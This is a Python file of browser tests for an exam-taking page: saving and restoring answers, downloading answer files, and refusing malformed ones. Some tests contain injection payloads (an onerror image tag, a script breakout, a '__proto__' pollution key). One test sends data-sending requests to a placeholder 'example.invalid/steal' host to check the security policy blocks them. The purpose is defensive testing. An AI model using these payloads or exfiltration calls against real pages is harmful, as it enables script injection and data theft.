"""Rehearsals for the page the new builder makes (dewmark/build.py).

The bugs these guard against live in the page, not the builder, so each test
sits a paper in a real Chromium and looks at what browser storage and the
downloaded files hold afterwards. They carry the step-2 rehearsals
(tests/browser/test_saving.py) over to the new page, and add what only the new
page has: a registry of answer kinds that each save and restore in a fixed
shape, an answer file that is checked rather than trusted, and a page that
connects to nothing.

The paper is one with every kind of box the page draws (conftest.py,
REHEARSAL_PAPER); its boxes are named for their parts, q1a to q3d.
"""

import json
import re

import pytest

KEY = "dewmark:rehearsal:student"
WRITING = '[data-answer="q1a"] textarea'

EVERYTHING = {
    "q1a": "alpha",
    "q1b": "x = 2",
    "q1c": "one two three",
    "q2a": "print(1)",
    "q2b": {"code": "print(2)"},
    "q3a": ["A", "C"],
    "q3b": ["root", "stem"],
    "q3c": ["plant", "leaves"],
    "q3d": ["3", "4"],
}


def open_page(context, path, accept_dialogs=False):
    page = context.new_page()
    page.errors, page.dialogs = [], []
    page.on("pageerror", lambda e: page.errors.append(str(e)))

    def on_dialog(dialog):
        page.dialogs.append(dialog.message)
        if accept_dialogs:
            dialog.accept()
        else:
            dialog.dismiss()

    page.on("dialog", on_dialog)
    page.goto(path.resolve().as_uri())
    return page


def begin(page, name="Agnes Nitt", number="S12345"):
    page.fill('[data-detail="full name"]', name)
    page.fill('[data-detail="student number"]', number)
    page.click("#dm-begin")
    page.wait_for_selector("#dm-app:not([hidden])")


def write(page, value):
    page.fill(WRITING, value)
    page.wait_for_timeout(200)


def stored(page):
    """Every dewmark record in this browser profile's storage, parsed."""
    return page.evaluate("""() => {
        const out = {};
        for (const key of Object.keys(localStorage)) {
            if (key.startsWith("dewmark")) {
                try { out[key] = JSON.parse(localStorage.getItem(key)); }
                catch (e) { out[key] = localStorage.getItem(key); }
            }
        }
        return out;
    }""")


def holds(records, name, value):
    """True if some stored record has `value` as the answer to `name`."""
    return any((record or {}).get("answers", {}).get(name) == value
               for record in records.values() if isinstance(record, dict))


def sit_and_leave(context, path, value):
    page = open_page(context, path)
    begin(page)
    write(page, value)
    page.close()


def fill_everything(page):
    page.fill('[data-answer="q1a"] textarea', "alpha")
    page.fill('[data-answer="q1b"] textarea', "x = 2")
    page.fill('[data-answer="q1c"] textarea', "one two three")
    page.fill('[data-answer="q2a"] textarea', "print(1)")
    page.fill('[data-answer="q2b"] textarea', "print(2)")
    page.check('[data-answer="q3a"] input[value="A"]')
    page.check('[data-answer="q3a"] input[value="C"]')
    page.select_option('[data-answer="q3b"] [data-slot="1"]', "root")
    page.select_option('[data-answer="q3b"] [data-slot="2"]', "stem")
    page.fill('[data-answer="q3c"] input[data-slot="1"]', "plant")
    page.select_option('[data-answer="q3c"] select[data-slot="2"]', "leaves")
    page.fill('[data-answer="q3d"] [data-slot="1"]', "3")
    page.fill('[data-answer="q3d"] [data-slot="2"]', "4")
    page.wait_for_timeout(200)


def finish_and_download(page, tmp_path, button="#dm-submit"):
    page.click("#dm-finish")
    with page.expect_download() as caught:
        page.click(button)
    target = tmp_path / caught.value.suggested_filename
    caught.value.save_as(target)
    return target


# --- the start screen must never write -------------------------------------------------------------------------

def test_a_reload_on_the_start_screen_keeps_the_saved_answers(context, pages):
    sit_and_leave(context, pages["student"], "4")
    page = open_page(context, pages["student"])
    page.wait_for_selector(".dm-restore-note")
    page.reload()
    page.wait_for_selector(".dm-restore-note")
    assert holds(stored(page), "q1a", "4")
    page.click(".dm-restore-note button")
    page.wait_for_selector("#dm-app:not([hidden])")
    assert page.input_value(WRITING) == "4"
    assert not page.errors


def test_closing_the_start_screen_keeps_the_saved_answers(context, pages):
    sit_and_leave(context, pages["student"], "4")
    page = open_page(context, pages["student"])
    page.wait_for_selector(".dm-restore-note")
    page.close(run_before_unload=True)
    assert holds(stored(open_page(context, pages["student"])), "q1a", "4")


def test_beginning_again_sets_the_saved_answers_aside_rather_than_deleting_them(context, pages):
    sit_and_leave(context, pages["student"], "4")
    page = open_page(context, pages["student"], accept_dialogs=True)
    page.wait_for_selector(".dm-restore-note")
    begin(page)
    assert page.input_value(WRITING) == ""
    write(page, "9")
    records = stored(page)
    assert holds(records, "q1a", "4"), "the earlier answers were deleted"
    assert holds(records, "q1a", "9")
    assert any(":set-aside:" in key for key in records)
    assert not page.errors


def test_declining_to_start_again_changes_nothing(context, pages):
    sit_and_leave(context, pages["student"], "4")
    page = open_page(context, pages["student"], accept_dialogs=False)
    page.wait_for_selector(".dm-restore-note")
    page.fill('[data-detail="full name"]', "Agnes Nitt")
    page.fill('[data-detail="student number"]', "S12345")
    page.click("#dm-begin")
    page.wait_for_timeout(300)
    assert page.is_hidden("#dm-app")
    assert holds(stored(page), "q1a", "4")


def test_each_detail_is_required_before_begin(context, pages):
    page = open_page(context, pages["student"])
    page.click("#dm-begin")
    page.wait_for_timeout(200)
    assert page.is_hidden("#dm-app") and page.dialogs
    assert stored(page) == {}


# --- one paper's pages keep separate slots ---------------------------------------------------------------------

def test_the_practice_page_does_not_offer_the_student_pages_work(context, pages):
    sit_and_leave(context, pages["student"], "4")
    practice = open_page(context, pages["practice"])
    practice.wait_for_timeout(300)
    assert practice.locator(".dm-restore-note").count() == 0
    begin(practice)
    write(practice, "7")
    practice.close()
    student = open_page(context, pages["student"])
    student.wait_for_selector(".dm-restore-note")
    student.click(".dm-restore-note button")
    student.wait_for_selector("#dm-app:not([hidden])")
    assert student.input_value(WRITING) == "4"
    assert set(stored(student)) == {KEY, "dewmark:rehearsal:practice"}


def test_the_answer_key_never_saves(context, pages):
    key = open_page(context, pages["answer_key"])
    begin(key)
    write(key, "5")
    key.reload()
    assert stored(key) == {}


def test_a_second_window_never_writes_over_the_first(context, pages):
    first = open_page(context, pages["student"])
    begin(first)
    write(first, "4")
    second = open_page(context, pages["student"])
    second.wait_for_timeout(500)
    assert second.is_disabled("#dm-begin")
    second.close(run_before_unload=True)
    assert holds(stored(first), "q1a", "4")
    assert first.input_value(WRITING) == "4"


# --- every kind saves in its shape and comes back --------------------------------------------------------------

def test_every_kind_is_saved_in_its_own_shape(context, pages):
    page = open_page(context, pages["student"])
    begin(page)
    fill_everything(page)
    record = stored(page)[KEY]
    assert record["answers"] == EVERYTHING
    assert record["format"] == "dewmark-answers/1"
    assert record["exam"] == {"code": "rehearsal", "version": "1", "title": "Rehearsal Paper"}
    assert record["page"] == "student"
    assert record["student"] == {"full name": "Agnes Nitt", "student number": "S12345"}
    assert record["started_at"] and record["saved_at"] and record["finished_at"] is None
    assert not page.errors


def test_every_kind_comes_back_after_a_reload(context, pages):
    page = open_page(context, pages["student"])
    begin(page)
    fill_everything(page)
    page.reload()
    page.click(".dm-restore-note button")
    page.wait_for_selector("#dm-app:not([hidden])")
    assert stored(page)[KEY]["answers"] == EVERYTHING
    assert page.input_value('[data-answer="q1b"] textarea') == "x = 2"
    assert page.input_value('[data-answer="q2b"] textarea') == "print(2)"
    assert page.is_checked('[data-answer="q3a"] input[value="A"]')
    assert not page.is_checked('[data-answer="q3a"] input[value="B"]')
    assert page.input_value('[data-answer="q3b"] [data-slot="2"]') == "stem"
    assert page.input_value('[data-answer="q3c"] select[data-slot="2"]') == "leaves"
    assert "3 words" in page.text_content('[data-answer="q1c"] .dm-word-count')
    assert not page.errors


def test_a_box_that_still_holds_only_its_starting_text_is_not_an_answer(context, pages):
    page = open_page(context, pages["student"])
    begin(page)
    assert page.input_value('[data-answer="q2b"] textarea') == 'print("hi")'
    page.fill('[data-answer="q1a"] textarea', "x")
    page.wait_for_timeout(200)
    assert "q2b" not in stored(page)[KEY]["answers"]
    page.fill('[data-answer="q1a"] textarea', "")
    page.wait_for_timeout(200)
    assert stored(page)[KEY]["answers"] == {}, "an emptied box is unanswered, not an empty answer"


def test_the_panel_ticks_a_question_once_a_part_of_it_has_something(context, pages):
    page = open_page(context, pages["student"])
    begin(page)
    assert page.locator(".dm-panel-q").count() == 3
    assert page.locator(".dm-panel-q.dm-done").count() == 0
    write(page, "x")
    assert page.locator('[data-panel-question="q1"].dm-done').count() == 1
    assert page.locator(".dm-panel-q.dm-done").count() == 1


# --- finishing: the report, the answer file, the readable copy -------------------------------------------------

def test_the_finish_report_names_the_empty_parts_and_what_they_were_worth(context, pages):
    page = open_page(context, pages["student"])
    begin(page)
    write(page, "x")
    page.click("#dm-finish")
    report = page.text_content("#dm-finish-report")
    assert "8 parts are empty, worth 16 marks" in report
    assert "1(a)" not in report.split("empty")[1] and "3(d)" in report
    assert "Handing in as: Agnes Nitt · S12345" in report
    page.click("#dm-keep-working")
    page.wait_for_selector("#dm-app:not([hidden])")
    fill_everything(page)
    page.click("#dm-finish")
    assert "Every part has something in it." in page.text_content("#dm-finish-report")


def test_the_answer_file_is_the_stored_record_with_a_finish_time(context, pages, tmp_path):
    page = open_page(context, pages["student"])
    begin(page)
    fill_everything(page)
    file = finish_and_download(page, tmp_path)
    assert re.fullmatch(r"dewmark_rehearsal_s12345_agnes-nitt\.json", file.name)
    record = json.loads(file.read_text())
    assert record["answers"] == EVERYTHING and record["finished_at"]
    assert record["student"] == {"full name": "Agnes Nitt", "student number": "S12345"}
    assert stored(page)[KEY]["finished_at"] == record["finished_at"]


def test_an_answer_file_loads_into_a_fresh_browser_and_the_work_is_back(
        context, browser, pages, tmp_path):
    page = open_page(context, pages["student"])
    begin(page)
    fill_everything(page)
    file = finish_and_download(page, tmp_path)

    other = browser.new_context(accept_downloads=True)
    try:
        fresh = open_page(other, pages["student"])
        with fresh.expect_file_chooser() as chooser:
            fresh.click("#dm-load-file")
        chooser.value.set_files(str(file))
        fresh.wait_for_selector("#dm-app:not([hidden])")
        assert fresh.input_value('[data-answer="q1b"] textarea') == "x = 2"
        assert fresh.is_checked('[data-answer="q3a"] input[value="C"]')
        assert stored(fresh)[KEY]["answers"] == EVERYTHING
        assert fresh.text_content("#dm-top-student") == "Agnes Nitt · S12345"
        assert not fresh.errors
    finally:
        other.close()


def load(browser_page, path):
    with browser_page.expect_file_chooser() as chooser:
        browser_page.click("#dm-load-file")
    chooser.value.set_files(str(path))
    browser_page.wait_for_timeout(300)


def good_record(**changes):
    record = {"format": "dewmark-answers/1",
              "exam": {"code": "rehearsal", "version": "1", "title": "Rehearsal Paper"},
              "page": "student", "student": {"full name": "A", "student number": "1"},
              "started_at": None, "saved_at": "2027-01-01T10:00:00.000Z", "finished_at": None,
              "answers": {}}
    record.update(changes)
    return record


@pytest.mark.parametrize("name, content", [
    ("not-json.json", "this is not json"),
    ("another-exam.json", json.dumps(good_record(exam={"code": "another"}))),
    ("old-format.json", json.dumps(good_record(format="dewmark/1"))),
    ("the-practice-page.json", json.dumps(good_record(page="practice"))),
    ("answers-a-list.json", json.dumps(good_record(answers=["q1a"]))),
    ("no-student.json", json.dumps({**good_record(), "student": None})),
    ("a-list.json", json.dumps([1, 2])),
])
def test_a_file_that_is_not_an_answer_file_for_this_paper_is_refused(
        context, pages, tmp_path, name, content):
    file = tmp_path / name
    file.write_text(content)
    page = open_page(context, pages["student"])
    load(page, file)
    assert page.dialogs, "no message was shown"
    assert page.is_hidden("#dm-app")
    assert stored(page) == {} and not page.errors


def test_an_answer_file_with_the_wrong_shapes_in_it_cannot_run_or_break_anything(
        context, pages, tmp_path):
    hostile = good_record(answers={
        "q1a": "<img src=x onerror=\"window.hacked=1\">",
        "q1b": 42,                                    # a number where a string goes
        "q3a": "A",                                   # a string where a list goes
        "q3b": ["not a choice", {"x": 1}],            # not the drop-down's choices
        "q3c": [None, "leaves"],
        "q3d": {"0": "x"},
        "q2b": "print(1)",                            # not {code: …}
        "nonsense": {"deep": ["x"]},                  # a name the paper does not have
        "__proto__": {"polluted": 1},
    }, student={"full name": "<b>Eve</b>", "student number": "1"})
    file = tmp_path / "hostile.json"
    file.write_text(json.dumps(hostile))
    page = open_page(context, pages["student"])
    load(page, file)
    page.wait_for_selector("#dm-app:not([hidden])")
    assert page.input_value(WRITING) == "<img src=x onerror=\"window.hacked=1\">"
    assert page.evaluate("window.hacked") is None
    assert page.locator("#dm-paper img").count() == 0
    assert page.evaluate("({}).polluted") is None
    assert page.input_value('[data-answer="q3b"] [data-slot="1"]') == ""
    assert page.input_value('[data-answer="q3c"] select[data-slot="2"]') == "leaves"
    assert page.locator('[data-answer="q3a"] input:checked').count() == 0
    assert page.evaluate("document.getElementById('dm-top-student').innerHTML") == \
        "&lt;b&gt;Eve&lt;/b&gt; · 1"
    assert not page.errors


def test_the_readable_copy_has_the_answers_as_text_and_nothing_that_runs(
        context, pages, tmp_path):
    page = open_page(context, pages["student"])
    begin(page)
    fill_everything(page)
    page.fill('[data-answer="q1a"] textarea', "</textarea><script>window.hacked=1</script>")
    page.wait_for_timeout(200)
    copy = finish_and_download(page, tmp_path, "#dm-save-readable")
    html = copy.read_text()
    assert copy.suffix == ".html"
    assert "<script" not in html.split("</textarea>")[0] and html.count("<script") == 0
    assert "<textarea" not in html and "<input" not in html and "<select" not in html
    assert "&lt;/textarea&gt;&lt;script&gt;window.hacked=1&lt;/script&gt;" in html
    assert "x = 2" in html and "print(2)" in html and "stem" in html and "leaves" in html
    assert "Agnes Nitt" in html and "Readable copy of a dewmark answer file" in html

    reader = open_page(context, copy)
    assert reader.evaluate("window.hacked") is None and not reader.errors
    assert reader.locator("#dm-paper").count() == 1


def test_a_part_left_empty_is_marked_not_attempted_in_the_readable_copy(
        context, pages, tmp_path):
    page = open_page(context, pages["student"])
    begin(page)
    write(page, "only this")
    html = finish_and_download(page, tmp_path, "#dm-save-readable").read_text()
    assert html.count("(not attempted)") == 8 and "only this" in html


# --- what the page does and does not do ------------------------------------------------------------------------

def test_the_student_page_has_no_hint_and_no_key_and_the_practice_page_has_its_hints(
        context, pages):
    student = open_page(context, pages["student"])
    assert student.locator(".dm-model, .dm-hint").count() == 0
    assert student.get_attribute("body", "data-variant") == "student"
    key = open_page(context, pages["answer_key"])
    assert key.locator(".dm-model").count() > 0
    assert key.get_attribute("body", "data-variant") == "answer-key"


def test_a_page_reaches_nothing_and_the_policy_stops_every_way_it_is_told_to_try(context, pages):
    reached = []
    page = context.new_page()
    page.on("requestfinished", lambda request: reached.append(request.url))
    violations = []
    page.expose_function("report", lambda what: violations.append(what))
    page.add_init_script("""document.addEventListener("securitypolicyviolation",
        (e) => window.report(e.effectiveDirective));""")
    page.goto(pages["student"].resolve().as_uri())
    begin(page)
    fill_everything(page)
    page.evaluate("""() => {
        fetch("https://example.invalid/steal").catch(() => {});
        const img = new Image(); img.src = "https://example.invalid/pixel.png";
        const form = document.createElement("form");
        form.action = "https://example.invalid/post"; form.method = "post";
        document.body.appendChild(form);
        try { form.submit(); } catch (e) {}
    }""")
    page.wait_for_timeout(500)
    # Chromium names a blocked picture as a request that failed; none finished.
    assert [u for u in reached if not u.startswith("file:")] == []
    assert {"connect-src", "img-src", "form-action"} <= set(violations)


def test_the_paper_page_is_laid_out_without_the_page_scrolling_sideways(context, pages):
    page = context.new_page()
    page.set_viewport_size({"width": 1024, "height": 768})
    page.goto(pages["student"].resolve().as_uri())
    begin(page)
    assert page.evaluate("document.documentElement.scrollWidth <= window.innerWidth")
